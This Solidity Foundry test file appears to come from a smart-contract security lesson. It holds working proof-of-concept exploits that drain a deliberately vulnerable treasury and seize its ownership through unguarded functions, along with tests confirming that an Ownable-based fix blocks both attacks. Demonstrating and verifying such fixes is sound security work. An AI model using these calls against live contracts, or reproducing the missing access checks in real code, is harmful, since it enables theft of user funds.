// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test} from "forge-std/Test.sol";
import {Ownable} from "@openzeppelin/contracts/access/Ownable.sol";

import {VulnerableTreasury} from "../../src/access-control/VulnerableTreasury.sol";
import {FixedTreasury} from "../../src/access-control/FixedTreasury.sol";

/// @title AccessControlPoC
/// @notice Proves missing access control on `VulnerableTreasury` and verifies that
///         `FixedTreasury` blocks unauthorized calls while preserving owner flows.
contract AccessControlPoC is Test {
    VulnerableTreasury internal treasury;

    address internal contributor = makeAddr("contributor");
    address internal attackerEoa = makeAddr("attackerEoa");

    uint256 internal constant TREASURY_BALANCE = 10 ether;

    function setUp() public {
        treasury = new VulnerableTreasury();

        // Fund the treasury as a normal user would.
        vm.deal(contributor, TREASURY_BALANCE);
        vm.prank(contributor);
        treasury.deposit{value: TREASURY_BALANCE}();

        assertEq(address(treasury).balance, TREASURY_BALANCE, "treasury should hold deposited ETH");
        assertEq(treasury.owner(), address(this), "deployer (this test) should be initial owner");
    }

    /// @notice PoC #1: any external account can call `withdraw` and drain the treasury.
    ///         No ownership or role is required — the function is `external` with no guard.
    function testExploit_AnyoneCanDrainTreasury() public {
        uint256 attackerBalanceBefore = attackerEoa.balance;

        vm.prank(attackerEoa);
        treasury.withdraw(payable(attackerEoa), TREASURY_BALANCE);

        assertEq(address(treasury).balance, 0, "treasury should be fully drained");
        assertEq(
            attackerEoa.balance,
            attackerBalanceBefore + TREASURY_BALANCE,
            "attacker should receive all treasury ETH"
        );
    }

    /// @notice PoC #2: any external account can call `setOwner` and permanently take over.
    ///         This is independent of the withdraw bug — the attacker does not need to
    ///         drain funds to cause lasting damage.
    function testExploit_AnyoneCanBecomeOwner() public {
        assertEq(treasury.owner(), address(this), "initial owner should be deployer");

        vm.prank(attackerEoa);
        treasury.setOwner(attackerEoa);

        assertEq(treasury.owner(), attackerEoa, "attacker should now own the treasury");
    }

    /// @notice Attacker cannot drain `FixedTreasury`; funds stay in the contract.
    function testFix_BlocksUnauthorizedWithdraw() public {
        FixedTreasury fixedTreasury = new FixedTreasury();

        vm.deal(contributor, TREASURY_BALANCE);
        vm.prank(contributor);
        fixedTreasury.deposit{value: TREASURY_BALANCE}();

        assertEq(address(fixedTreasury).balance, TREASURY_BALANCE);

        vm.prank(attackerEoa);
        vm.expectRevert(
            abi.encodeWithSelector(Ownable.OwnableUnauthorizedAccount.selector, attackerEoa)
        );
        fixedTreasury.withdraw(payable(attackerEoa), TREASURY_BALANCE);

        assertEq(
            address(fixedTreasury).balance,
            TREASURY_BALANCE,
            "treasury must keep all funds after blocked withdraw"
        );
        assertEq(attackerEoa.balance, 0, "attacker must not receive any ETH");
    }

    /// @notice Attacker cannot seize ownership of `FixedTreasury`.
    function testFix_BlocksUnauthorizedSetOwner() public {
        FixedTreasury fixedTreasury = new FixedTreasury();
        address initialOwner = fixedTreasury.owner();

        vm.prank(attackerEoa);
        vm.expectRevert(
            abi.encodeWithSelector(Ownable.OwnableUnauthorizedAccount.selector, attackerEoa)
        );
        fixedTreasury.setOwner(attackerEoa);

        assertEq(fixedTreasury.owner(), initialOwner, "owner must not change");
    }

    /// @notice Legitimate owner can still withdraw and transfer ownership.
    function testFix_AllowsOwnerFunctions() public {
        FixedTreasury fixedTreasury = new FixedTreasury();
        address newOwner = makeAddr("newOwner");

        vm.deal(contributor, TREASURY_BALANCE);
        vm.prank(contributor);
        fixedTreasury.deposit{value: TREASURY_BALANCE}();

        uint256 contributorBalanceBefore = contributor.balance;

        fixedTreasury.withdraw(payable(contributor), TREASURY_BALANCE);

        assertEq(address(fixedTreasury).balance, 0, "owner withdraw should empty treasury");
        assertEq(
            contributor.balance,
            contributorBalanceBefore + TREASURY_BALANCE,
            "recipient should receive withdrawn ETH"
        );

        fixedTreasury.setOwner(newOwner);
        assertEq(fixedTreasury.owner(), newOwner, "ownership should transfer to newOwner");
    }
}
